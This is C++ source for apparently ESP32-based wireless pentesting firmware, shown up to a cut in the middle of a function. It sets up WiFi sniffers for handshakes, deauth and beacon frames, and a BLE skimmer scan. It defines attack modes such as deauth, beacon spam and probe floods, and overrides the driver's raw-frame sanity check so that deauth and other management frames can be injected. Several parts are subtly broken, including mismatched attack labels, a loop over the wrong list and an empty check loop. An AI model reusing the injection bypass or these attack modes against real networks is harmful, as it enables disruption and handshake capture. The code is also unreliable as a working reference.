#include "WiFiScan.h"

int num_beacon = 0;
int num_deauth = 0;
int num_probe = 0;
int num_eapol = 0;

LinkedList<ssid> *ssids;
LinkedList<AccessPoint> *access_points;

bool WiFiScan::is_json = false;

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
	if (arg == 31337)
		return 1;
	else
		return 0;
}

#ifdef HAS_BT
class bluetoothScanAllCallback : public BLEAdvertisedDeviceCallbacks
{

	void onResult(BLEAdvertisedDevice *advertisedDevice)
	{

		int buf = 0;

		String display_string = "";
		if (buf >= 0)
		{
			display_string.concat(" RSSI: ");
			display_string.concat(advertisedDevice->getRSSI());
			Serial.print(" RSSI: ");
			Serial.print(advertisedDevice->getRSSI());

			display_string.concat(" ");
			Serial.print(" ");

			Serial.print("Device: ");
			if (advertisedDevice->getName().length() != 0)
			{
				display_string.concat(advertisedDevice->getName().c_str());
				Serial.print(advertisedDevice->getName().c_str());
			}
			else
			{
				display_string.concat(advertisedDevice->getAddress().toString().c_str());
				Serial.print(advertisedDevice->getAddress().toString().c_str());
			}
		}
	}
};

class bluetoothScanSkimmersCallback : public BLEAdvertisedDeviceCallbacks
{
	void onResult(BLEAdvertisedDevice *advertisedDevice)
	{
		String bad_list[bad_list_length] = {"HC-03", "HC-05", "HC-06"};
		int buf = 0;

		if (buf >= 0)
		{
			Serial.print("Device: ");
			String display_string = "";
			if (advertisedDevice->getName().length() != 0)
			{
				Serial.print(advertisedDevice->getName().c_str());
				for (uint8_t i = 0; i < bad_list_length; i++)
				{
					// ON SCREEN
				}
			}
			else
			{
				Serial.print(advertisedDevice->getAddress().toString().c_str());
			}
			Serial.print(" RSSI: ");
			Serial.println(advertisedDevice->getRSSI());
		}
	}
};
#endif

WiFiScan::WiFiScan()
{
}

void WiFiScan::RunSetup()
{
	if (ieee80211_raw_frame_sanity_check(31337, 0, 0) == 1)
		this->wsl_bypass_enabled = true;
	else
		this->wsl_bypass_enabled = false;

	ssids = new LinkedList<ssid>();
	access_points = new LinkedList<AccessPoint>();

#ifdef HAS_BT
	NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
	NimBLEDevice::setScanDuplicateCacheSize(200);
	NimBLEDevice::init("");
	pBLEScan = NimBLEDevice::getScan(); // create new scan
	this->ble_initialized = true;

	this->shutdownBLE();
#endif

	this->initWiFi(1);
}

String WiFiScan::getSignalStrength(int rssi)
{
	if (rssi > -30)
		return "████";
	else if (rssi > -67)
		return "███⯐";
	else if (rssi > -70)
		return "██⯐⯐";
	else if (rssi > -80)
		return "█⯐⯐⯐";
	else
		return "⯐⯐⯐⯐";
}

String WiFiScan::getBeaconText(LinkedList<char> *beacon)
{
	char beacon_addr[] = "00 00";

	sprintf(beacon_addr, "%02x %02x", beacon->get(0), beacon->get(1));

	return beacon_addr;
}

String WiFiScan::getMacAddressText(int bssid[])
{
	char addr[] = "00:00:00:00:00:00";

	sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

	return addr;
}

void WiFiScan::foundAP(AccessPoint ap)
{
	if (is_json)
	{
		DynamicJsonDocument doc(1024);

		doc["type"] = "found";
		doc["essid"] = ap.essid == "" ? "*Hidden*" : ap.essid;
		doc["channel"] = ap.channel;
		doc["bssid"] = getMacAddressText(ap.bssid);
		doc["selected"] = ap.selected;
		doc["beacon"] = getBeaconText(ap.beacon);
		doc["rssi"] = ap.rssi;

		serializeJson(doc, Serial);
		Serial.println();
	}
	else
	{
		Serial.println("-------------------");
		Serial.printf("%s %s %d\n%s Ch:%d\nBeacon: %s\n", ap.essid == "" ? "(っ ̫-) *Hidden*" : ap.essid.c_str(), getSignalStrength(ap.rssi).c_str(), ap.rssi, getMacAddressText(ap.bssid).c_str(), ap.channel, getBeaconText(ap.beacon).c_str());
	}
}

void WiFiScan::foundSniffAP(AccessPoint ap) {
	if (is_json) {
		DynamicJsonDocument doc(1024);

		doc["type"] = "sniff";
		doc["essid"] = ap.essid == "" ? "*Hidden*" : ap.essid;
		doc["channel"] = ap.channel;
		doc["bssid"] = getMacAddressText(ap.bssid);
		doc["selected"] = ap.selected;
		doc["beacon"] = getBeaconText(ap.beacon);
		doc["rssi"] = ap.rssi;

		serializeJson(doc, Serial);
		Serial.println();
	} else {
		Serial.printf("%d %s %s Ch:%d\n", ap.rssi, ap.essid == "" ? "(っ ̫-) *Hidden*" : ap.essid.c_str(), getMacAddressText(ap.bssid).c_str(), ap.channel);
	}
}

void WiFiScan::updateAP(AccessPoint ap, int id) {
	if (is_json) {
		DynamicJsonDocument doc(1024);

		doc["type"] = "update";
		doc["id"] = id;
		doc["essid"] = ap.essid == "" ? "*Hidden*" : ap.essid;
		doc["channel"] = ap.channel;
		doc["bssid"] = getMacAddressText(ap.bssid);
		doc["selected"] = ap.selected;
		doc["beacon"] = getBeaconText(ap.beacon);
		doc["rssi"] = ap.rssi;

		serializeJson(doc, Serial);
		Serial.println();
	}
}

void WiFiScan::listAPs()
{
	if (is_json)
	{
		DynamicJsonDocument doc(1024);

		for (int i = 0; i < access_points->size(); i++)
		{
			AccessPoint ap = access_points->get(i);

			doc["ap"][i]["id"] = i;
			doc["ap"][i]["essid"] = ap.essid == "" ? "*Hidden*" : ap.essid;
			doc["ap"][i]["channel"] = ap.channel;
			doc["ap"][i]["bssid"] = getMacAddressText(ap.bssid);
			doc["ap"][i]["selected"] = ap.selected;
			doc["ap"][i]["beacon"] = getBeaconText(ap.beacon);
			doc["ap"][i]["rssi"] = ap.rssi;
		}

		serializeJson(doc, Serial);
		Serial.println();
	}
	else
	{
		for (int i = 0; i < access_points->size(); i++)
		{
			AccessPoint ap = access_points->get(i);
			Serial.printf("[%d] %s %02x:%02x:%02x:%02x:%02x:%02x %s %d Ch:%d %s\n", i, ap.essid == "" ? "(っ ̫-) *Hidden*" : ap.essid.c_str(), ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5], getSignalStrength(ap.rssi), ap.rssi, ap.channel, ap.selected ? " (selected)" : "");
		}
	}
}

void WiFiScan::listSSIDs()
{
	if (is_json)
	{
		DynamicJsonDocument doc(1024);

		for (int i = 0; i < access_points->size(); i++)
		{
			ssid station = ssids->get(i);

			doc["ssid"][i]["id"] = i;
			doc["ssid"][i]["essid"] = station.essid;
			doc["ssid"][i]["bssid"] = getMacAddressText(station.bssid);
			doc["ssid"][i]["selected"] = station.selected;
		}

		serializeJson(doc, Serial);
		Serial.println();
	}
	else
	{
		for (int i = 0; i < ssids->size(); i++)
		{
			ssid station = ssids->get(i);
			Serial.printf("[%d] %s%s %02x:%02x:%02x:%02x:%02x:%02x\n", i, station.essid.c_str(), station.selected ? " (selected)" : "", station.bssid[0], station.bssid[1], station.bssid[2], station.bssid[3], station.bssid[4], station.bssid[5]);
		}
	}
}

void WiFiScan::listAll()
{
	if (is_json)
	{
		DynamicJsonDocument doc(1024);

		for (int i = 0; i < access_points->size(); i++)
		{
			AccessPoint ap = access_points->get(i);

			doc["ap"][i]["id"] = i;
			doc["ap"][i]["essid"] = ap.essid == "" ? "*Hidden*" : ap.essid;
			doc["ap"][i]["channel"] = ap.channel;
			doc["ap"][i]["bssid"] = getMacAddressText(ap.bssid);
			doc["ap"][i]["selected"] = ap.selected;
			doc["ap"][i]["beacon"] = getBeaconText(ap.beacon);
			doc["ap"][i]["rssi"] = ap.rssi;
		}

		for (int i = 0; i < ssids->size(); i++)
		{
			ssid station = ssids->get(i);

			doc["ssid"][i]["id"] = i;
			doc["ssid"][i]["essid"] = station.essid;
			doc["ssid"][i]["bssid"] = getMacAddressText(station.bssid);
			doc["ssid"][i]["selected"] = station.selected;
		}

		serializeJson(doc, Serial);
		Serial.println();
	}
	else
	{
		if (access_points->size() > 0)
				Serial.println("--- APs ------------");

		listAPs();

		if (ssids->size() > 0)
			Serial.println("--- SSIDs ----------");

		listSSIDs();
	}
}

int WiFiScan::clearAPs()
{
	int num_cleared = access_points->size();
	access_points->clear();
	Serial.println("access_points: " + (String)access_points->size());
	return num_cleared;
}

int WiFiScan::clearSSIDs()
{
	int num_cleared = ssids->size();
	ssids->clear();
	Serial.println("ssids: " + (String)ssids->size());
	return num_cleared;
}

bool WiFiScan::addSSID(String essid)
{
	ssid s = {essid, {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
	ssids->add(s);
	Serial.println(ssids->get(ssids->size() - 1).essid);

	return true;
}

int WiFiScan::generateSSIDs(int count)
{
	uint8_t num_gen = count;
	for (uint8_t x = 0; x < num_gen; x++)
	{
		String essid = "";

		for (uint8_t i = 0; i < 6; i++)
			essid.concat(alfa[random(65)]);

		ssid s = {essid, {random(256), random(256), random(256), random(256), random(256), random(256)}, false};
		ssids->add(s);
		Serial.println(ssids->get(ssids->size() - 1).essid);
	}

	return num_gen;
}

// Apply WiFi settings
void WiFiScan::initWiFi(uint8_t scan_mode)
{
	// Set the channel
	if (scan_mode != WIFI_SCAN_OFF)
	{
		this->changeChannel();

		this->force_pmkid = settings_obj.loadSetting<bool>("ForcePMKID");
		this->force_probe = settings_obj.loadSetting<bool>("ForceProbe");
		this->save_pcap = settings_obj.loadSetting<bool>("SavePCAP");
	}
}

bool WiFiScan::scanning()
{
	if (this->currentScanMode == WIFI_SCAN_OFF)
		return false;
	else
		return true;
}

// Function to prepare to run a specific scan
void WiFiScan::StartScan(uint8_t scan_mode)
{
	this->initWiFi(scan_mode);
	if (scan_mode == WIFI_SCAN_OFF)
		StopScan(scan_mode);
	else if (scan_mode == WIFI_SCAN_PROBE)
		RunProbeScan(scan_mode);
	else if (scan_mode == WIFI_SCAN_EAPOL)
		RunEapolScan(scan_mode);
	else if (scan_mode == WIFI_SCAN_ACTIVE_EAPOL)
		RunEapolScan(scan_mode);
	else if (scan_mode == WIFI_SCAN_AP)
		RunBeaconScan(scan_mode);
	else if (scan_mode == WIFI_SCAN_TARGET_AP)
		RunAPScan(scan_mode);
	else if (scan_mode == WIFI_SCAN_TARGET_AP_FULL)
		RunAPScan(scan_mode);
	else if (scan_mode == WIFI_SCAN_PWN)
		RunPwnScan(scan_mode);
	else if (scan_mode == WIFI_SCAN_DEAUTH)
		RunDeauthScan(scan_mode);
	else if (scan_mode == WIFI_PACKET_MONITOR)
	{
		RunPacketMonitor(scan_mode);
	}
	else if (scan_mode == WIFI_ATTACK_BEACON_LIST)
		this->startWiFiAttacks(scan_mode, "Beacon Spam List");
	else if (scan_mode == WIFI_ATTACK_BEACON_SPAM)
		this->startWiFiAttacks(scan_mode, "Beacon Spam Random");
	else if (scan_mode == WIFI_ATTACK_RICK_ROLL)
		this->startWiFiAttacks(scan_mode, "Rick Roll Beacon");
	else if (scan_mode == WIFI_ATTACK_AUTH)
		this->startWiFiAttacks(scan_mode, "SavePCAP");
	else if (scan_mode == WIFI_ATTACK_DEAUTH)
		this->startWiFiAttacks(scan_mode, "Probe Flood");
	else if (scan_mode == WIFI_ATTACK_AP_SPAM)
		this->startWiFiAttacks(scan_mode, " AP Beacon Spam ");
	else if (scan_mode == BT_SCAN_ALL)
	{
#ifdef HAS_BT
		RunBluetoothScan(scan_mode);
#endif
	}
	else if (scan_mode == BT_SCAN_SKIMMERS)
	{
#ifdef HAS_BT
		RunBluetoothScan(scan_mode);
#endif
	}
	else if (scan_mode == WIFI_SCAN_ESPRESSIF)
		RunEspressifScan(scan_mode);

	WiFiScan::currentScanMode = scan_mode;
}

void WiFiScan::startWiFiAttacks(uint8_t scan_mode, String title_string)
{
	// Common wifi attack configurations
	packets_sent = 0;
	WiFi.mode(WIFI_AP_STA);
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_max_tx_power(82);
	this->wifi_initialized = true;
	flipper_led.attackLED();
	initTime = millis();
}

bool WiFiScan::shutdownWiFi()
{
	if (this->wifi_initialized)
	{
		esp_wifi_set_promiscuous(false);
		WiFi.disconnect();
		WiFi.mode(WIFI_OFF);

		esp_wifi_set_mode(WIFI_MODE_NULL);
		esp_wifi_stop();
		esp_wifi_deinit();

		flipper_led.offLED();

		this->wifi_initialized = false;
		return true;
	}
	else
	{
		return false;
	}
}

bool WiFiScan::shutdownBLE()
{
#ifdef HAS_BT
	if (this->ble_initialized)
	{
		pBLEScan->stop();

		pBLEScan->clearResults();
		BLEDevice::deinit();
		flipper_led.offLED();

		this->ble_initialized = false;
		return true;
	}
	else
	{
		return false;
	}
#endif

	return true;
}

// Function to stop all wifi scans
void WiFiScan::StopScan(uint8_t scan_mode)
{
	if ((currentScanMode == WIFI_SCAN_PROBE) ||
		(currentScanMode == WIFI_SCAN_AP) ||
		(currentScanMode == WIFI_SCAN_TARGET_AP) ||
		(currentScanMode == WIFI_SCAN_TARGET_AP_FULL) ||
		(currentScanMode == WIFI_SCAN_PWN) ||
		(currentScanMode == WIFI_SCAN_ESPRESSIF) ||
		(currentScanMode == WIFI_SCAN_EAPOL) ||
		(currentScanMode == WIFI_SCAN_ACTIVE_EAPOL) ||
		(currentScanMode == WIFI_SCAN_ALL) ||
		(currentScanMode == WIFI_SCAN_DEAUTH) ||
		(currentScanMode == WIFI_ATTACK_BEACON_LIST) ||
		(currentScanMode == WIFI_ATTACK_BEACON_SPAM) ||
		(currentScanMode == WIFI_ATTACK_AUTH) ||
		(currentScanMode == WIFI_ATTACK_DEAUTH) ||
		(currentScanMode == WIFI_ATTACK_MIMIC) ||
		(currentScanMode == WIFI_ATTACK_RICK_ROLL) ||
		(currentScanMode == WIFI_PACKET_MONITOR) ||
		(currentScanMode == LV_JOIN_WIFI))
	{
		this->shutdownWiFi();
	}

	else if ((currentScanMode == BT_SCAN_ALL) ||
			 (currentScanMode == BT_SCAN_SKIMMERS))
	{
#ifdef HAS_BT
		this->shutdownBLE();
#endif
	}
}

String WiFiScan::getStaMAC()
{
	char *buf;
	uint8_t mac[6];
	char macAddrChr[18] = {0};
	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
	this->wifi_initialized = true;
	sprintf(macAddrChr,
			"%02X:%02X:%02X:%02X:%02X:%02X",
			mac[0],
			mac[1],
			mac[2],
			mac[3],
			mac[4],
			mac[5]);
	this->shutdownWiFi();
	return String(macAddrChr);
}

String WiFiScan::getApMAC()
{
	char *buf;
	uint8_t mac[6];
	char macAddrChr[18] = {0};
	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	esp_err_t mac_status = esp_wifi_get_mac(WIFI_IF_AP, mac);
	this->wifi_initialized = true;
	sprintf(macAddrChr,
			"%02X:%02X:%02X:%02X:%02X:%02X",
			mac[0],
			mac[1],
			mac[2],
			mac[3],
			mac[4],
			mac[5]);
	this->shutdownWiFi();
	return String(macAddrChr);
}

String WiFiScan::freeRAM()
{
	char s[150];
	sprintf(s, "RAM Free: %u bytes", esp_get_free_heap_size());
	this->free_ram = String(esp_get_free_heap_size());
	return String(s);
}

// Function to start running a beacon scan
void WiFiScan::RunAPScan(uint8_t scan_mode)
{
	sd_obj.openCapture("ap");
	flipper_led.sniffLED();

	Serial.println("Clearing APs..." + (String)access_points->size());

	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&apSnifferCallbackFull);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	this->wifi_initialized = true;
	initTime = millis();
}

void WiFiScan::RunClearAPs()
{
	this->clearAPs();
}

void WiFiScan::RunClearSSIDs()
{
	this->clearSSIDs();
}

void WiFiScan::RunGenerateSSIDs(int count)
{
	this->generateSSIDs(count);
}

void WiFiScan::RunShutdownWiFi()
{
	if (this->wifi_initialized)
		this->shutdownWiFi();
}

void WiFiScan::RunShutdownBLE()
{
	if (this->ble_initialized)
		this->shutdownBLE();
}

void WiFiScan::RunInfo()
{
	String sta_mac = this->getStaMAC();
	String ap_mac = this->getApMAC();
	String free_ram = this->freeRAM();

	Serial.println(free_ram);
}

void WiFiScan::RunEspressifScan(uint8_t scan_mode)
{
	sd_obj.openCapture("espressif");
	flipper_led.sniffLED();

	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&espressifSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	this->wifi_initialized = true;
	initTime = millis();
}

void WiFiScan::RunPacketMonitor(uint8_t scan_mode)
{
	flipper_led.sniffLED();

	sd_obj.openCapture("packet_monitor");

	Serial.println("Running packet scan...");
	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&wifiSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	this->wifi_initialized = true;
	uint32_t initTime = millis();
}

void WiFiScan::RunEapolScan(uint8_t scan_mode)
{
	flipper_led.sniffLED();
	num_eapol = 0;

	sd_obj.openCapture("eapol");

	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_AP);

	esp_err_t err;
	wifi_config_t conf;
	err = esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR);
	if (err != 0)
	{
		Serial.print("could not set protocol : err=0x");
		Serial.println(err, HEX);
	}

	esp_wifi_get_config((wifi_interface_t)WIFI_IF_AP, &conf);
	conf.ap.ssid[0] = '\0';
	conf.ap.ssid_len = 0;
	conf.ap.channel = this->set_channel;
	conf.ap.ssid_hidden = 1;
	conf.ap.max_connection = 0;
	conf.ap.beacon_interval = 60000;

	err = esp_wifi_set_config((wifi_interface_t)WIFI_IF_AP, &conf);
	if (err != 0)
	{
		Serial.print("AP config set error, Maurauder SSID might visible : err=0x");
		Serial.println(err, HEX);
	}

	esp_wifi_start();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	if (scan_mode == WIFI_SCAN_ACTIVE_EAPOL)
		esp_wifi_set_promiscuous_rx_cb(&activeEapolSnifferCallback);
	else
		esp_wifi_set_promiscuous_rx_cb(&eapolSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	this->wifi_initialized = true;
	initTime = millis();
}

// Function to prepare for beacon mimic
void WiFiScan::RunMimicFlood(uint8_t scan_mode)
{
	packets_sent = 0;
	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_AP_STA);
	esp_wifi_start();
	esp_wifi_set_promiscuous_filter(NULL);
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_max_tx_power(78);
	this->wifi_initialized = true;
	initTime = millis();
}

void WiFiScan::RunPwnScan(uint8_t scan_mode)
{
	sd_obj.openCapture("pwnagotchi");
	flipper_led.sniffLED();

	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&pwnSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	this->wifi_initialized = true;
	initTime = millis();
}

// Function to start running a beacon scan
void WiFiScan::RunBeaconScan(uint8_t scan_mode)
{
	sd_obj.openCapture("beacon");
	flipper_led.sniffLED();

	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	this->wifi_initialized = true;
	initTime = millis();
}

void WiFiScan::RunDeauthScan(uint8_t scan_mode)
{
	sd_obj.openCapture("deauth");
	flipper_led.sniffLED();

	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&deauthSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	this->wifi_initialized = true;
	initTime = millis();
}

// Function for running probe request scan
void WiFiScan::RunProbeScan(uint8_t scan_mode)
{
	sd_obj.openCapture("probe");
	flipper_led.sniffLED();

	esp_wifi_init(&cfg);
	esp_wifi_set_storage(WIFI_STORAGE_RAM);
	esp_wifi_set_mode(WIFI_MODE_NULL);
	esp_wifi_start();
	esp_wifi_set_promiscuous(true);
	esp_wifi_set_promiscuous_filter(&filt);
	esp_wifi_set_promiscuous_rx_cb(&probeSnifferCallback);
	esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
	this->wifi_initialized = true;
	initTime = millis();
}

// Function to start running any BLE scan
void WiFiScan::RunBluetoothScan(uint8_t scan_mode)
{
#ifdef HAS_BT
	NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
	NimBLEDevice::setScanDuplicateCacheSize(200);
	NimBLEDevice::init("");
	pBLEScan = NimBLEDevice::getScan(); // create new scan
	if (scan_mode == BT_SCAN_ALL)
	{
		pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanAllCallback(), false);
	}
	else if (scan_mode == BT_SCAN_SKIMMERS)
	{
		pBLEScan->setAdvertisedDeviceCallbacks(new bluetoothScanSkimmersCallback(), false);
	}
	pBLEScan->setActiveScan(true); // active scan uses more power, but get results faster
	pBLEScan->setInterval(97);
	pBLEScan->setWindow(37); // less or equal setInterval value
	pBLEScan->setMaxResults(0);
	pBLEScan->start(0, scanCompleteCB, false);
	Serial.println("Started BLE Scan");
	this->ble_initialized = true;
	initTime = millis();
#endif
}

// Function that is called when BLE scan is completed
#ifdef HAS_BT
void WiFiScan::scanCompleteCB(BLEScanResults scanResults)
{
	printf("Scan complete!\n");
	printf("Found %d devices\n", scanResults.getCount());
	scanResults.dump();
} // scanCompleteCB
#endif

// Function to extract MAC addr from a packet at given offset
void WiFiScan::getMAC(char *addr, uint8_t *data, uint16_t offset)
{
	sprintf(addr, "%02x:%02x:%02x:%02x:%02x:%02x", data[offset + 0], data[offset + 1], data[offset + 2], data[offset + 3], data[offset + 4], data[offset + 5]);
}

void WiFiScan::espressifSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type)
{
	bool save_packet = settings_obj.loadSetting<bool>("SavePCAP");

	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
	int len = snifferPacket->rx_ctrl.sig_len;

	String display_string = "";
	String src_addr_string = "";

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
	}
	int fctl = ntohs(frameControl->fctl);
	const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
	const WifiMgmtHdr *hdr = &ipkt->hdr;

	char addr[] = "00:00:00:00:00:00";
	getMAC(addr, snifferPacket->payload, 10);

	src_addr_string.concat(addr);
	bool match = false;

	for (int i = 0; i < (sizeof(espressif_macs) / sizeof(espressif_macs[0])); i++)
	{
		if (src_addr_string.startsWith(espressif_macs[i]))
		{
			match = true;
			break;
		}
	}

	if (!match)
		return;

	delay(random(0, 10));
	Serial.print("RSSI: ");
	Serial.print(snifferPacket->rx_ctrl.rssi);
	Serial.print(" Ch: ");
	Serial.print(snifferPacket->rx_ctrl.channel);
	Serial.print(" BSSID: ");

	Serial.print(addr);
	// display_string.concat(" RSSI: ");
	// display_string.concat(snifferPacket->rx_ctrl.rssi);
	display_string.concat("CH: " + (String)snifferPacket->rx_ctrl.channel);

	// display_string.concat(" ");
	display_string.concat(" -> ");
	display_string.concat(addr);

	for (int i = 0; i < 19 - snifferPacket->payload[37]; i++)
	{
		display_string.concat(" ");
	}

	Serial.print(" ");
	Serial.println();

	if (save_packet)
		sd_obj.addPacket(snifferPacket->payload, len);
}

void WiFiScan::pwnSnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type)
{
	bool save_packet = settings_obj.loadSetting<bool>("SavePCAP");

	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
	int len = snifferPacket->rx_ctrl.sig_len;

	String display_string = "";
	String src = "";
	String essid = "";

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;

		int buf = 0;

		if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
		{
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);
			src.concat(addr);
			if (src == "de:ad:be:ef:de:ad")
			{

				delay(random(0, 10));
				Serial.print("RSSI: ");
				Serial.print(snifferPacket->rx_ctrl.rssi);
				Serial.print(" Ch: ");
				Serial.print(snifferPacket->rx_ctrl.channel);
				Serial.print(" BSSID: ");
				Serial.print(addr);
				// display_string.concat(addr);
				display_string.concat("CH: " + (String)snifferPacket->rx_ctrl.channel);
				Serial.print(" ESSID: ");
				display_string.concat(" -> ");

				// Just grab the first 255 bytes of the pwnagotchi beacon
				// because that is where the name is
				// for (int i = 0; i < snifferPacket->payload[37]; i++)
				for (int i = 0; i < len - 37; i++)
				{
					Serial.print((char)snifferPacket->payload[i + 38]);

					if (isAscii(snifferPacket->payload[i + 38]))
						essid.concat((char)snifferPacket->payload[i + 38]);
					else
						Serial.println("Got non-ascii character: " + (String)(char)snifferPacket->payload[i + 38]);
				}

				// Load json
				// DynamicJsonBuffer jsonBuffer; // ArduinoJson v5
				DynamicJsonDocument json(1024); // ArduinoJson v6
				// JsonObject& json = jsonBuffer.parseObject(essid); // ArduinoJson v5
				//  ArduinoJson v6
				if (deserializeJson(json, essid))
				{
					Serial.println("\nCould not parse Pwnagotchi json");
					display_string.concat(essid);
				}
				else
				{
					Serial.println("\nSuccessfully parsed json");
					String json_output;
					// json.printTo(json_output); // ArduinoJson v5
					serializeJson(json, json_output); // ArduinoJson v6
					Serial.println(json_output);
					display_string.concat(json["name"].as<String>() + " pwnd: " + json["pwnd_tot"].as<String>());
				}

				int temp_len = display_string.length();
				for (int i = 0; i < 40 - temp_len; i++)
				{
					display_string.concat(" ");
				}

				Serial.print(" ");
				Serial.println();

				if (save_packet)
					sd_obj.addPacket(snifferPacket->payload, len);
			}
		}
	}
}

void WiFiScan::apSnifferCallbackFull(void *buf, wifi_promiscuous_pkt_type_t type)
{
	bool save_packet = settings_obj.loadSetting<bool>("SavePCAP");

	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
	WifiMgmtHdr *frameControl = (WifiMgmtHdr *)snifferPacket->payload;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
	int len = snifferPacket->rx_ctrl.sig_len;

	String display_string = "";
	String essid = "";
	String bssid = "";

	if (type == WIFI_PKT_MGMT)
	{
		len -= 4;
		int fctl = ntohs(frameControl->fctl);
		const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
		const WifiMgmtHdr *hdr = &ipkt->hdr;

		int buf = 0;
		

		if ((snifferPacket->payload[0] == 0x80) && (buf == 0))
		{
			char addr[] = "00:00:00:00:00:00";
			getMAC(addr, snifferPacket->payload, 10);

			bool in_list = false;
			bool mac_match = true;

			for (int i = 0; i < access_points->size(); i++)
			{
				mac_match = true;
				AccessPoint temp_ap = access_points->get(i);

				for (int x = 0; x < 6; x++)
				{
					if (snifferPacket->payload[x + 10] != temp_ap.bssid[x])
					{
						mac_match = false;
						break;
					}
				}

				if (mac_match)
				{
					in_list = true;

					if (temp_ap.rssi != snifferPacket->rx_ctrl.rssi) {
						temp_ap.rssi = snifferPacket->rx_ctrl.rssi;
						updateAP(temp_ap, i);
					}

					break;
				}
			}

			if (!in_list)
			{

				delay(random(0, 10));
				display_string.concat(" -> ");

				for (int i = 0; i < snifferPacket->payload[37]; i++)
				{
					display_string.concat((char)snifferPacket->payload[i + 38]);
					essid.concat((char)snifferPacket->payload[i + 38]);
				}

				bssid.concat(addr);

				int temp_len = display_string.length();
